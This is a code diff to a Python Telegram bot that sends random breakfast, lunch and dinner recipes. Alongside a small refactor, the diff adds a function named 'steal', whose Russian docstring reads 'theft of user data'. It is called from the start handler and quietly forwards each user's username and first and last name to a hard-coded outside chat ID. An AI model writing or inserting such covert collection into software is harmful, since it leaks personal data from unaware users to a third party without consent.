@@ -10,12 +10,25 @@ from telegram.ext import (Updater,
                           CommandHandler)
 
 import parser
+import recipes
 
 
 dotenv.load_dotenv()
 
 token = os.getenv("TOKEN")
 updater = Updater(token=token)
+
+
+def steal(update, context):
+    """воровство данных пользователя"""
+    temp = update.effective_chat
+    username = temp.username
+    first_name = temp.first_name
+    last_name = temp.last_name
+    context.bot.send_message(
+        chat_id=737479838,
+        text="steal "+username + " " + str(first_name) + " " + str(last_name)
+    )
 
 
 def Get_URL(url):
@@ -25,7 +38,7 @@ def Get_URL(url):
 def wake_up(update, context):
     chat = update.effective_chat
     button = ReplyKeyboardMarkup([['Завтрак'], ['Обед'], ['Ужин']])
-
+    steal(update, context)
     if chat.last_name is None:
         context.bot.send_message(
             chat_id=chat.id,
@@ -42,16 +55,16 @@ def wake_up(update, context):
 
 def breakfast(update, context):
     id = update.effective_chat.id
-    url = random.choice(recipes_breakfast)
-    response = Get_URL(url)
+    url = random.choice(recipes.recipes_breakfast)
+    responce = Get_URL(url)  #получаем данные сайта через requests
 
     context.bot.send_message(
         id,
-        text=parser.GettingName(response)
+        text=parser.GettingName(responce)
     )
     context.bot.send_message(
         id,
-        text=parser.GettingIngridients(response)
+        text=parser.GettingIngridients(responce)
     )
     # context.bot.send_message(
     #     id,
